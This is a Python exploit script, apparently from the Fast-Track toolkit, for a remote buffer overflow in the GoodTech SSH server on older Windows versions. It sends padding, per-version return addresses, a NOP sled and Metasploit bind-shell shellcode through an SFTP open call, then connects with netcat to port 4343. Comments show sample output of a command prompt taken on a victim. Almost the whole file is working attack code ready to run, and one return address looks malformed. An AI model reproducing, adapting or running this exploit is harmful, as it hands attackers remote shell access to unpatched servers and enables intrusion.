#!/usr/bin/env python
#
# Goodtech SSH Remote Buffer Overflow Universal Exploit
# Written by: ReL1K
# Original exploit discovery by: r0ut3r
#
#
# Tested on GoodTech 6.4 Windows 2003 SP0 and SP1
# 
# rel1k@box:~/$ python goodtech.py 
# Enter the IP or hostname of victim: 10.211.55.5
# Enter the username for server: administrator
# Enter password for the server: password
# Enter the following target:
#
# 1. Windows 2k3 SP0
# 2. Windows 2k3 SP1
# 3. Windows XP SP0
# 4. Windows XP SP1
# 5. Windows XP SP2
# 6. Windows 2000 SP3
# 7. Windows 2000 SP4
# 8. Windows NT SP6
#
# Enter number: 1
#
# +++ Sending evil payload... +++
# +++ Evil payload send.. +++
# Try connecting to victim on 4343
# rel1k@box:~/$ nc 10.211.55.5 4343
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# C:\Program Files\GoodTech SSH Server>
#
# ************** START CODE EXPLOIT HERE **********************
# Paramiko SSH Module used
try:
   import paramiko
   import sys
   import subprocess
   import time
except IndexError: 
     print "Paramiko SSH Module not installed, download from:\n http://www.lag.net/paramiko/download/paramiko-1.7.4.tar.gz\nor in debian package is python-paramiko"
     print "\nExiting Fast-Track....\n\n"
     sys.exit()
client=paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
buffer= "A"*164
# set victim IP
print """
Goodtech SSH Remote Buffer Overflow Universal Exploit
Written by: ReL1K
Original exploit discovery by: r0ut3r

Special Thanks: muts, stazz, whipsmack, sasquatch,
leroy, hdm

Example:

+++ Sending evil payload... +++
+++ Evil payload send.. +++
Try connecting to victim on 4343
rel1k@box:~/$ nc 10.211.55.5 4343
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\Program Files\GoodTech SSH Server>

*** End Example ***

"""
hostname=raw_input("Enter the IP or hostname of victim: ")
# set username
username=raw_input("Enter the username for server: ")
# set password
password=raw_input("Enter password for the server: ")
# define what windows version
ver=raw_input("""
Enter the following target:

1. Windows 2k3 SP0
2. Windows 2k3 SP1
3. Windows XP SP0
4. Windows XP SP1
5. Windows XP SP2
6. Windows 2000 SP3
7. Windows 2000 SP4
8. Windows NT SP6

Enter number: """)
if ver == '1':
   eip = "\xb4\xd6\x5d\x77" # call esp in Win2k3 SP0 shell32.dll 
if ver == '2':
   eip = "\x23\x14\xb5\7c" # call esp in Win2k3 SP1 shell32.dll
if ver == '3':
   eip = "\x53\x8e\x43\x77" # call esp in WinXP SP0 shell32.dll
if ver == '4':
   eip = "\xa3\x2e\x5a\x77" # call esp in WinXP SP1 shell32.dll
if ver == '5':
   eip = "\xe3\x7b\xc7\x7c" # call esp in WinXP SP2 shell32.dll
if ver == '6':
   eip = "\x9d\x01\x44\x78" # call esp in Win2000 SP3 shell32.dll
if ver == '7':
   eip = "\xc5\xad\x48\x78" # call esp in Win2000 SP4 shell32.dll
if ver == '8':
   eip = "\x91\x92\xc6\x77" # call esp in WinNT SP6 shell32.dll
nopsled= "\x90"*20 # pad the buffer with nops
# win32_bind -  EXITFUNC=seh LPORT=4343 Size=344 Encoder=PexFnstenvSub http://metasploit.com
shellcode= "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xad"
shellcode+= "\x98\x05\xdb\x83\xeb\xfc\xe2\xf4\x51\xf2\xee\x96\x45\x61\xfa\x24"
shellcode+= "\x52\xf8\x8e\xb7\x89\xbc\x8e\x9e\x91\x13\x79\xde\xd5\x99\xea\x50"
shellcode+= "\xe2\x80\x8e\x84\x8d\x99\xee\x92\x26\xac\x8e\xda\x43\xa9\xc5\x42"
shellcode+= "\x01\x1c\xc5\xaf\xaa\x59\xcf\xd6\xac\x5a\xee\x2f\x96\xcc\x21\xf3"
shellcode+= "\xd8\x7d\x8e\x84\x89\x99\xee\xbd\x26\x94\x4e\x50\xf2\x84\x04\x30"
shellcode+= "\xae\xb4\x8e\x52\xc1\xbc\x19\xba\x6e\xa9\xde\xbf\x26\xdb\x35\x50"
shellcode+= "\xed\x94\x8e\xab\xb1\x35\x8e\x9b\xa5\xc6\x6d\x55\xe3\x96\xe9\x8b"
shellcode+= "\x52\x4e\x63\x88\xcb\xf0\x36\xe9\xc5\xef\x76\xe9\xf2\xcc\xfa\x0b"
shellcode+= "\xc5\x53\xe8\x27\x96\xc8\xfa\x0d\xf2\x11\xe0\xbd\x2c\x75\x0d\xd9"
shellcode+= "\xf8\xf2\x07\x24\x7d\xf0\xdc\xd2\x58\x35\x52\x24\x7b\xcb\x56\x88"
shellcode+= "\xfe\xcb\x46\x88\xee\xcb\xfa\x0b\xcb\xf0\x15\x2c\xcb\xcb\x8c\x3a"
shellcode+= "\x38\xf0\xa1\xc1\xdd\x5f\x52\x24\x7b\xf2\x15\x8a\xf8\x67\xd5\xb3"
shellcode+= "\x09\x35\x2b\x32\xfa\x67\xd3\x88\xf8\x67\xd5\xb3\x48\xd1\x83\x92"
shellcode+= "\xfa\x67\xd3\x8b\xf9\xcc\x50\x24\x7d\x0b\x6d\x3c\xd4\x5e\x7c\x8c"
shellcode+= "\x52\x4e\x50\x24\x7d\xfe\x6f\xbf\xcb\xf0\x66\xb6\x24\x7d\x6f\x8b"
shellcode+= "\xf4\xb1\xc9\x52\x4a\xf2\x41\x52\x4f\xa9\xc5\x28\x07\x66\x47\xf6"
shellcode+= "\x53\xda\x29\x48\x20\xe2\x3d\x70\x06\x33\x6d\xa9\x53\x2b\x13\x24"
shellcode+= "\xd8\xdc\xfa\x0d\xf6\xcf\x57\x8a\xfc\xc9\x6f\xda\xfc\xc9\x50\x8a"
shellcode+= "\x52\x48\x6d\x76\x74\x9d\xcb\x88\x52\x4e\x6f\x24\x52\xaf\xfa\x0b"
shellcode+= "\x26\xcf\xf9\x58\x69\xfc\xfa\x0d\xff\x67\xd5\xb3\x5d\x12\x01\x84"
shellcode+= "\xfe\x67\xd3\x24\x7d\x98\x05\xdb"
try:
   client.connect((hostname), 22, (username), (password))
   try:
      print " +++ Sending evil payload... +++"
      sendbuffer=client.open_sftp()
      sendbuffer.open(buffer+eip+nopsled+shellcode)
   except IOError: pass
   print " +++ Evil payload send.. +++\nConnecting to victim on 4343 in 10 seconds...\n"
   client.close()
   time.sleep(10)
   connecting=subprocess.Popen("nc %s 4343" % (hostname), shell=True).wait()
except KeyboardInterrupt: sys.exit()
except Exception: print "Either the server doesn't exist or isn't vulnerable.."
